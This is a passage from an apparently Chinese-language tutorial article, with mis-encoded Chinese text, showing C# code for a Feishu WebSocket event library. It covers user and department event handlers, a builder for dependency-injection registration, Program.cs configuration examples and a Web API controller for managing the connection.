        _notificationService = notificationService ?? <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(notificationService));
    }
    
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">ProcessBusinessLogicAsync</span>(<span class="hljs-params">
        EventData eventData, 
        UserCreatedResult? userCreated, 
        CancellationToken cancellationToken = <span class="hljs-literal">default</span></span>)</span>
    {
        <span class="hljs-keyword">if</span> (eventData == <span class="hljs-literal">null</span>)
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(eventData));

        _logger.LogInformation(<span class="hljs-string">"ğŸ‘¤ [ç”¨æˆ·äº‹ä»¶] å¼€å§‹å¤„ç†ç”¨æˆ·åˆ›å»ºäº‹ä»¶: {EventId}"</span>, eventData.EventId);

        <span class="hljs-keyword">try</span>
        {
            <span class="hljs-comment">// 1. æ•°æ®éªŒè¯å’Œè½¬æ¢</span>
            <span class="hljs-keyword">var</span> user = ValidateAndTransformUser(userCreated?.Object);
            
            <span class="hljs-comment">// 2. ä¿å­˜åˆ°æ•°æ®åº“</span>
            <span class="hljs-keyword">await</span> _eventService.RecordUserEventAsync(user, cancellationToken);
            
            <span class="hljs-comment">// 3. ä¸šåŠ¡é€»è¾‘å¤„ç†</span>
            <span class="hljs-keyword">await</span> ProcessUserEventAsync(user, cancellationToken);
            
            <span class="hljs-comment">// 4. æ›´æ–°ç»Ÿè®¡ä¿¡æ¯</span>
            _eventService.IncrementUserCount();

            _logger.LogInformation(<span class="hljs-string">"âœ… [ç”¨æˆ·äº‹ä»¶] ç”¨æˆ·åˆ›å»ºäº‹ä»¶å¤„ç†å®Œæˆ: ç”¨æˆ·ID {UserId}, ç”¨æˆ·å {UserName}"</span>,
                user.UserId, user.UserName);
        }
        <span class="hljs-keyword">catch</span> (Exception ex)
        {
            _logger.LogError(ex, <span class="hljs-string">"âŒ [ç”¨æˆ·äº‹ä»¶] å¤„ç†ç”¨æˆ·åˆ›å»ºäº‹ä»¶å¤±è´¥: {EventId}"</span>, eventData.EventId);
            <span class="hljs-keyword">throw</span>;
        }
    }
    
    <span class="hljs-function"><span class="hljs-keyword">private</span> UserData <span class="hljs-title">ValidateAndTransformUser</span>(<span class="hljs-params">UserCreatedResult? userCreated</span>)</span>
    {
        <span class="hljs-keyword">if</span> (userCreated == <span class="hljs-literal">null</span>)
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentException(<span class="hljs-string">"ç”¨æˆ·åˆ›å»ºæ•°æ®ä¸èƒ½ä¸ºç©º"</span>);
        
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.IsNullOrWhiteSpace(userCreated.UserId))
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentException(<span class="hljs-string">"ç”¨æˆ·IDä¸èƒ½ä¸ºç©º"</span>);
        
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.IsNullOrWhiteSpace(userCreated.Name))
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentException(<span class="hljs-string">"ç”¨æˆ·åä¸èƒ½ä¸ºç©º"</span>);
        
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> UserData
        {
            UserId = userCreated.UserId,
            UserName = userCreated.Name,
            Email = userCreated.Email ?? <span class="hljs-built_in">string</span>.Empty,
            Department = userCreated.Department ?? <span class="hljs-built_in">string</span>.Empty,
            EmployeeType = userCreated.EmployeeType ?? <span class="hljs-built_in">string</span>.Empty,
            CreatedAt = userCreated.CreatedAt
        };
    }
    
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">ProcessUserEventAsync</span>(<span class="hljs-params">UserData user, CancellationToken cancellationToken</span>)</span>
    {
        <span class="hljs-comment">// æ¨¡æ‹Ÿå¼‚æ­¥ä¸šåŠ¡æ“ä½œ</span>
        <span class="hljs-keyword">await</span> Task.Delay(<span class="hljs-number">100</span>, cancellationToken);
        
        <span class="hljs-comment">// éªŒè¯å¿…è¦å­—æ®µ</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.IsNullOrWhiteSpace(user.UserId))
        {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentException(<span class="hljs-string">"ç”¨æˆ·IDä¸èƒ½ä¸ºç©º"</span>);
        }
        
        <span class="hljs-comment">// æ¨¡æ‹Ÿå‘é€æ¬¢è¿é€šçŸ¥</span>
        <span class="hljs-keyword">if</span> (_options.EnableLogging)
            _logger.LogInformation(<span class="hljs-string">"ğŸ“§ [ç”¨æˆ·äº‹ä»¶] å‘é€æ¬¢è¿é€šçŸ¥ç»™ç”¨æˆ·: {UserName} ({Email})"</span>,
                user.UserName, user.Email);
        
        <span class="hljs-keyword">await</span> _notificationService.SendWelcomeEmailAsync(user, cancellationToken);
        
        <span class="hljs-comment">// æ¨¡æ‹Ÿç”¨æˆ·é…ç½®æ–‡ä»¶åˆ›å»º</span>
        <span class="hljs-keyword">if</span> (_options.EnableLogging)
            _logger.LogInformation(<span class="hljs-string">"âš™ï¸ [ç”¨æˆ·äº‹ä»¶] åˆ›å»ºç”¨æˆ·é…ç½®æ–‡ä»¶: {UserId}"</span>, user.UserId);
        
        <span class="hljs-keyword">await</span> _eventService.CreateUserProfileAsync(user, cancellationToken);
        
        <span class="hljs-comment">// æ¨¡æ‹Ÿæƒé™åˆå§‹åŒ–</span>
        <span class="hljs-keyword">if</span> (_options.EnableLogging)
            _logger.LogInformation(<span class="hljs-string">"ğŸ” [ç”¨æˆ·äº‹ä»¶] åˆå§‹åŒ–ç”¨æˆ·æƒé™: {UserId}"</span>, user.UserId);
        
        <span class="hljs-keyword">await</span> _eventService.InitializeUserPermissionsAsync(user, cancellationToken);
        
        <span class="hljs-keyword">await</span> Task.CompletedTask;
    }
}
</code></pre>
<h3 data-id="heading-15">4.2 ç»§æ‰¿é¢„å®šä¹‰äº‹ä»¶å¤„ç†å™¨</h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> æ¼”ç¤ºéƒ¨é—¨äº‹ä»¶å¤„ç†å™¨ - ç»§æ‰¿é¢„å®šä¹‰çš„éƒ¨é—¨åˆ›å»ºäº‹ä»¶å¤„ç†å™¨</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">DemoDepartmentEventHandler</span> : <span class="hljs-title">DepartmentCreatedEventHandler</span>
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> DemoEventService _eventService;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> INotificationService _notificationService;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> IPermissionService _permissionService;

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">DemoDepartmentEventHandler</span>(<span class="hljs-params">
        ILogger&lt;DemoDepartmentEventHandler&gt; logger, 
        DemoEventService eventService,
        INotificationService notificationService,
        IPermissionService permissionService</span>) : <span class="hljs-title">base</span>(<span class="hljs-params">logger</span>)</span>
    {
        _eventService = eventService ?? <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(eventService));
        _notificationService = notificationService ?? <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(notificationService));
        _permissionService = permissionService ?? <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(permissionService));
    }

    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">ProcessBusinessLogicAsync</span>(<span class="hljs-params">
        EventData eventData, 
        ObjectEventResult&lt;DepartmentCreatedResult&gt;? departmentData, 
        CancellationToken cancellationToken = <span class="hljs-literal">default</span></span>)</span>
    {
        <span class="hljs-keyword">if</span> (eventData == <span class="hljs-literal">null</span>)
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(eventData));

        _logger.LogInformation(<span class="hljs-string">"[éƒ¨é—¨äº‹ä»¶] å¼€å§‹å¤„ç†éƒ¨é—¨åˆ›å»ºäº‹ä»¶: {EventId}"</span>, eventData.EventId);

        <span class="hljs-keyword">try</span>
        {
            <span class="hljs-comment">// 1. éªŒè¯éƒ¨é—¨æ•°æ®</span>
            <span class="hljs-keyword">var</span> department = ValidateDepartmentData(departmentData?.Object);
            
            <span class="hljs-comment">// 2. è®°å½•äº‹ä»¶åˆ°æœåŠ¡</span>
            <span class="hljs-keyword">await</span> _eventService.RecordDepartmentEventAsync(department, cancellationToken);
            
            <span class="hljs-comment">// 3. å¤„ç†éƒ¨é—¨ä¸šåŠ¡é€»è¾‘</span>
            <span class="hljs-keyword">await</span> ProcessDepartmentEventAsync(department, cancellationToken);
            
            <span class="hljs-comment">// 4. åˆå§‹åŒ–éƒ¨é—¨æƒé™</span>
            <span class="hljs-keyword">await</span> InitializeDepartmentPermissionsAsync(department, cancellationToken);
            
            <span class="hljs-comment">// 5. æ›´æ–°ç»Ÿè®¡ä¿¡æ¯</span>
            _eventService.IncrementDepartmentCount();

            _logger.LogInformation(<span class="hljs-string">"[éƒ¨é—¨äº‹ä»¶] éƒ¨é—¨åˆ›å»ºäº‹ä»¶å¤„ç†å®Œæˆ: éƒ¨é—¨ID {DepartmentId}, éƒ¨é—¨å {DepartmentName}"</span>,
                department.DepartmentId, department.Name);
        }
        <span class="hljs-keyword">catch</span> (Exception ex)
        {
            _logger.LogError(ex, <span class="hljs-string">"[éƒ¨é—¨äº‹ä»¶] å¤„ç†éƒ¨é—¨åˆ›å»ºäº‹ä»¶å¤±è´¥: {EventId}"</span>, eventData.EventId);
            <span class="hljs-keyword">throw</span>;
        }
    }
    
    <span class="hljs-function"><span class="hljs-keyword">private</span> DepartmentData <span class="hljs-title">ValidateDepartmentData</span>(<span class="hljs-params">DepartmentCreatedResult? departmentResult</span>)</span>
    {
        <span class="hljs-keyword">if</span> (departmentResult == <span class="hljs-literal">null</span>)
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentException(<span class="hljs-string">"éƒ¨é—¨åˆ›å»ºæ•°æ®ä¸èƒ½ä¸ºç©º"</span>);
        
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.IsNullOrWhiteSpace(departmentResult.DepartmentId))
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentException(<span class="hljs-string">"éƒ¨é—¨IDä¸èƒ½ä¸ºç©º"</span>);
        
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.IsNullOrWhiteSpace(departmentResult.Name))
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentException(<span class="hljs-string">"éƒ¨é—¨åä¸èƒ½ä¸ºç©º"</span>);
        
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> DepartmentData
        {
            DepartmentId = departmentResult.DepartmentId,
            Name = departmentResult.Name,
            ParentDepartmentId = departmentResult.ParentDepartmentId,
            LeaderUserId = departmentResult.LeaderUserId,
            DepartmentLevel = departmentResult.DepartmentLevel,
            CreatedAt = DateTime.UtcNow
        };
    }
    
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">ProcessDepartmentEventAsync</span>(<span class="hljs-params">DepartmentData department, CancellationToken cancellationToken</span>)</span>
    {
        <span class="hljs-comment">// æ¨¡æ‹Ÿå¼‚æ­¥ä¸šåŠ¡æ“ä½œ</span>
        <span class="hljs-keyword">await</span> Task.Delay(<span class="hljs-number">100</span>, cancellationToken);
        
        <span class="hljs-comment">// æ¨¡æ‹Ÿè®¾ç½®éƒ¨é—¨é…ç½®</span>
        <span class="hljs-keyword">if</span> (_options.EnableLogging)
            _logger.LogInformation(<span class="hljs-string">"[éƒ¨é—¨äº‹ä»¶] è®¾ç½®éƒ¨é—¨é…ç½®: {DepartmentName}"</span>, department.Name);
        
        <span class="hljs-keyword">await</span> _eventService.ConfigureDepartmentSettingsAsync(department, cancellationToken);
        
        <span class="hljs-comment">// é€šçŸ¥éƒ¨é—¨ä¸»ç®¡</span>
        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">string</span>.IsNullOrWhiteSpace(department.LeaderUserId))
        {
            <span class="hljs-keyword">if</span> (_options.EnableLogging)
                _logger.LogInformation(<span class="hljs-string">"[éƒ¨é—¨äº‹ä»¶] é€šçŸ¥éƒ¨é—¨ä¸»ç®¡: {LeaderUserId}"</span>, department.LeaderUserId);
            
            <span class="hljs-keyword">await</span> _notificationService.NotifyDepartmentLeaderAsync(department, cancellationToken);
        }
        
        <span class="hljs-comment">// å¤„ç†å±‚çº§å…³ç³»</span>
        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">string</span>.IsNullOrWhiteSpace(department.ParentDepartmentId))
        {
            <span class="hljs-keyword">if</span> (_options.EnableLogging)
                _logger.LogInformation(<span class="hljs-string">"[éƒ¨é—¨äº‹ä»¶] å»ºç«‹å±‚çº§å…³ç³»: {DepartmentId} -&gt; {ParentDepartmentId}"</span>,
                    department.DepartmentId, department.ParentDepartmentId);
            
            <span class="hljs-keyword">await</span> _eventService.UpdateDepartmentHierarchyAsync(department, cancellationToken);
        }
        
        <span class="hljs-keyword">await</span> Task.CompletedTask;
    }
    
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">async</span> Task <span class="hljs-title">InitializeDepartmentPermissionsAsync</span>(<span class="hljs-params">DepartmentData department, CancellationToken cancellationToken</span>)</span>
    {
        <span class="hljs-keyword">if</span> (_options.EnableLogging)
            _logger.LogInformation(<span class="hljs-string">"[éƒ¨é—¨äº‹ä»¶] åˆå§‹åŒ–éƒ¨é—¨æƒé™: {DepartmentName}"</span>, department.Name);
        
        <span class="hljs-comment">// åˆ›å»ºéƒ¨é—¨é»˜è®¤æƒé™</span>
        <span class="hljs-keyword">var</span> defaultPermissions = <span class="hljs-keyword">new</span>[]
        {
            <span class="hljs-string">"department.view"</span>,
            <span class="hljs-string">"department.edit"</span>,
            <span class="hljs-string">"department.member.manage"</span>
        };
        
        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">var</span> permission <span class="hljs-keyword">in</span> defaultPermissions)
        {
            <span class="hljs-keyword">await</span> _permissionService.GrantPermissionAsync(
                department.DepartmentId, permission, cancellationToken);
        }
        
        <span class="hljs-comment">// ä¸ºéƒ¨é—¨ä¸»ç®¡åˆ†é…ç®¡ç†å‘˜æƒé™</span>
        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">string</span>.IsNullOrWhiteSpace(department.LeaderUserId))
        {
            <span class="hljs-keyword">await</span> _permissionService.GrantPermissionAsync(
                department.DepartmentId, <span class="hljs-string">"department.admin"</span>, cancellationToken);
        }
    }
}
</code></pre>
<h3 data-id="heading-16">4.3 ä¾èµ–æ³¨å…¥é…ç½®</h3>
<p><strong>å»ºé€ è€…æ¨¡å¼åº”ç”¨</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> é£ä¹¦WebSocketæœåŠ¡æ³¨å†Œæ‰©å±•</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title">FeishuWebSocketServiceExtensions</span>
{
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> ä½¿ç”¨å»ºé€ è€…æ¨¡å¼æ³¨å†Œé£ä¹¦WebSocketæœåŠ¡</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> IFeishuWebSocketBuilder <span class="hljs-title">AddFeishuWebSocketBuilder</span>(<span class="hljs-params"><span class="hljs-keyword">this</span> IServiceCollection services</span>)</span>
    {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> FeishuWebSocketBuilder(services);
    }
}

<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> é£ä¹¦WebSocketæœåŠ¡å»ºé€ è€…</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">FeishuWebSocketBuilder</span>
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> IServiceCollection _services;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> List&lt;Type&gt; _handlerTypes = <span class="hljs-keyword">new</span>();
    <span class="hljs-keyword">private</span> FeishuWebSocketOptions _options = <span class="hljs-keyword">new</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">bool</span> _useMultiHandler = <span class="hljs-literal">false</span>;
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">FeishuWebSocketBuilder</span>(<span class="hljs-params">IServiceCollection services</span>)</span>
    {
        _services = services ?? <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(services));
    }
    
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> ä»é…ç½®æ–‡ä»¶è¯»å–é…ç½®</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> FeishuWebSocketBuilder <span class="hljs-title">ConfigureFrom</span>(<span class="hljs-params">IConfiguration configuration</span>)</span>
    {
        configuration.GetSection(<span class="hljs-string">"Feishu:WebSocket"</span>).Bind(_options);
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>;
    }
    
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> é…ç½®é€‰é¡¹</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> FeishuWebSocketBuilder <span class="hljs-title">ConfigureOptions</span>(<span class="hljs-params">Action&lt;FeishuWebSocketOptions&gt; configure</span>)</span>
    {
        configure?.Invoke(_options);
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>;
    }
    
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> å¯ç”¨å¤šå¤„ç†å™¨æ¨¡å¼</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> FeishuWebSocketBuilder <span class="hljs-title">UseMultiHandler</span>()</span>
    {
        _useMultiHandler = <span class="hljs-literal">true</span>;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>;
    }
    
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> æ·»åŠ äº‹ä»¶å¤„ç†å™¨</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> FeishuWebSocketBuilder <span class="hljs-title">AddHandler</span>&lt;<span class="hljs-title">THandler</span>&gt;() <span class="hljs-keyword">where</span> THandler : <span class="hljs-keyword">class</span>, IFeishuEventHandler</span>
    {
        _handlerTypes.Add(<span class="hljs-keyword">typeof</span>(THandler));
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>;
    }
    
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> æ„å»ºæœåŠ¡æ³¨å†Œ</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> IServiceCollection <span class="hljs-title">Build</span>()</span>
    {
        <span class="hljs-comment">// æ³¨å†Œé…ç½®é€‰é¡¹</span>
        _services.Configure(_options);
        
        <span class="hljs-keyword">if</span> (_useMultiHandler)
        {
            <span class="hljs-comment">// å¤šå¤„ç†å™¨æ¨¡å¼</span>
            _services.AddSingleton&lt;IFeishuEventHandlerFactory, DefaultFeishuEventHandlerFactory&gt;();
            
            <span class="hljs-comment">// æ³¨å†Œæ‰€æœ‰å¤„ç†å™¨ç±»å‹</span>
            <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">var</span> handlerType <span class="hljs-keyword">in</span> _handlerTypes)
            {
                _services.AddSingleton(<span class="hljs-keyword">typeof</span>(IFeishuEventHandler), handlerType);
            }
            
            _services.AddSingleton&lt;IFeishuWebSocketManager, FeishuWebSocketManager&gt;();
        }
        <span class="hljs-keyword">else</span>
        {
            <span class="hljs-comment">// å•å¤„ç†å™¨æ¨¡å¼</span>
            <span class="hljs-keyword">var</span> handlerType = _handlerTypes.FirstOrDefault();
            <span class="hljs-keyword">if</span> (handlerType != <span class="hljs-literal">null</span>)
            {
                _services.AddSingleton(<span class="hljs-keyword">typeof</span>(IFeishuEventHandler), handlerType);
                _services.AddSingleton&lt;IFeishuWebSocketManager, FeishuWebSocketManager&gt;();
            }
        }
        
        <span class="hljs-keyword">return</span> _services;
    }
}
</code></pre>
<p><strong>å®é™…ä½¿ç”¨ç¤ºä¾‹</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// Program.cs ä¸­çš„é…ç½®ç¤ºä¾‹</span>
<span class="hljs-keyword">var</span> builder = WebApplication.CreateBuilder(args);

<span class="hljs-comment">// æ–¹å¼ä¸€ï¼šå»ºé€ è€…æ¨¡å¼æ³¨å†Œï¼ˆæ¨èï¼‰</span>
builder.Services.AddFeishuWebSocketBuilder()
    .ConfigureFrom(builder.Configuration)           <span class="hljs-comment">// ä»é…ç½®æ–‡ä»¶è¯»å–</span>
    .UseMultiHandler()                              <span class="hljs-comment">// å¯ç”¨å¤šå¤„ç†å™¨æ¨¡å¼</span>
    .AddHandler&lt;ReceiveMessageEventHandler&gt;()        <span class="hljs-comment">// æ·»åŠ æ¶ˆæ¯å¤„ç†å™¨</span>
    .AddHandler&lt;UserCreatedEventHandler&gt;()           <span class="hljs-comment">// æ·»åŠ ç”¨æˆ·äº‹ä»¶å¤„ç†å™¨</span>
    .AddHandler&lt;DepartmentCreatedEventHandler&gt;()      <span class="hljs-comment">// æ·»åŠ éƒ¨é—¨äº‹ä»¶å¤„ç†å™¨</span>
    .Build();                                       <span class="hljs-comment">// æ„å»ºæœåŠ¡æ³¨å†Œ</span>

<span class="hljs-comment">// æ–¹å¼äºŒï¼šç®€åŒ–æ³¨å†Œ</span>
builder.Services.AddFeishuWebSocketServiceWithSingleHandler&lt;ReceiveMessageEventHandler&gt;(
    options =&gt; {
        options.AutoReconnect = <span class="hljs-literal">true</span>;
        options.MaxReconnectAttempts = <span class="hljs-number">5</span>;
        options.HeartbeatIntervalMs = <span class="hljs-number">30000</span>;
        options.EnableLogging = <span class="hljs-literal">true</span>;
    });

<span class="hljs-comment">// æ–¹å¼ä¸‰ï¼šä»é…ç½®æ–‡ä»¶æ³¨å†Œ</span>
builder.Services.AddFeishuWebSocketService(builder.Configuration);
</code></pre>
<h3 data-id="heading-17">4.4 Web APIé›†æˆ</h3>
<p><strong>RESTful APIè®¾è®¡</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> WebSocketç®¡ç†æ§åˆ¶å™¨</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
[<span class="hljs-meta">ApiController</span>]
[<span class="hljs-meta">Route(<span class="hljs-string">"api/[controller]"</span>)</span>]
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">WebSocketController</span> : <span class="hljs-title">ControllerBase</span>
{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> IFeishuWebSocketManager _webSocketManager;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> ILogger&lt;WebSocketController&gt; _logger;

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">WebSocketController</span>(<span class="hljs-params">IFeishuWebSocketManager webSocketManager,
        ILogger&lt;WebSocketController&gt; logger</span>)</span>
    {
        _webSocketManager = webSocketManager ?? <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(webSocketManager));
        _logger = logger ?? <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-keyword">nameof</span>(logger));
    }
    
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> å¯åŠ¨WebSocketè¿æ¥</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    [<span class="hljs-meta">HttpPost(<span class="hljs-string">"connect"</span>)</span>]
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task&lt;IActionResult&gt; <span class="hljs-title">ConnectAsync</span>()</span>
    {
        <span class="hljs-keyword">try</span>
        {
            <span class="hljs-keyword">await</span> _webSocketManager.StartAsync();
            
            <span class="hljs-keyword">return</span> Ok(<span class="hljs-keyword">new</span> 
            { 
                Success = <span class="hljs-literal">true</span>,
                Message = <span class="hljs-string">"WebSocketè¿æ¥å¯åŠ¨æˆåŠŸ"</span>,
                Timestamp = DateTime.UtcNow
            });
        }
        <span class="hljs-keyword">catch</span> (Exception ex)
        {
            _logger.LogError(ex, <span class="hljs-string">"å¯åŠ¨WebSocketè¿æ¥å¤±è´¥"</span>);
            <span class="hljs-keyword">return</span> BadRequest(<span class="hljs-keyword">new</span> 
            { 
                Success = <span class="hljs-literal">false</span>,
                Message = <span class="hljs-string">$"WebSocketè¿æ¥å¯åŠ¨å¤±è´¥: <span class="hljs-subst">{ex.Message}</span>"</span>,
                Timestamp = DateTime.UtcNow
            });
        }
    }
    
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> æ–­å¼€WebSocketè¿æ¥</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    [<span class="hljs-meta">HttpPost(<span class="hljs-string">"disconnect"</span>)</span>]
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">async</span> Task&lt;IActionResult&gt; <span class="hljs-title">DisconnectAsync</span>()</span>
    {
        <span class="hljs-keyword">try</span>
        {
            <span class="hljs-keyword">await</span> _webSocketManager.StopAsync();
            
            <span class="hljs-keyword">return</span> Ok(<span class="hljs-keyword">new</span> 
            { 
                Success = <span class="hljs-literal">true</span>,
                Message = <span class="hljs-string">"WebSocketè¿æ¥æ–­å¼€æˆåŠŸ"</span>,
                Timestamp = DateTime.UtcNow
            });
        }
        <span class="hljs-keyword">catch</span> (Exception ex)
        {
            _logger.LogError(ex, <span class="hljs-string">"æ–­å¼€WebSocketè¿æ¥å¤±è´¥"</span>);
            <span class="hljs-keyword">return</span> BadRequest(<span class="hljs-keyword">new</span> 
            { 
                Success = <span class="hljs-literal">false</span>,
                Message = <span class="hljs-string">$"WebSocketè¿æ¥æ–­å¼€å¤±è´¥: <span class="hljs-subst">{ex.Message}</span>"</span>,
                Timestamp = DateTime.UtcNow
            });
        }
    }
    
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> è·å–è¿æ¥çŠ¶æ€</span>
    <span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
    [<span class="hljs-meta">HttpGet(<span class="hljs-string">"status"</span>)</span>]
    <span class="hljs-function"><span class="hljs-keyword">public</span> IActionResult <span class="hljs-title">GetStatus</span>()</span>
    {
        <span class="hljs-keyword">var</span> stats = _webSocketManager.GetConnectionStats();
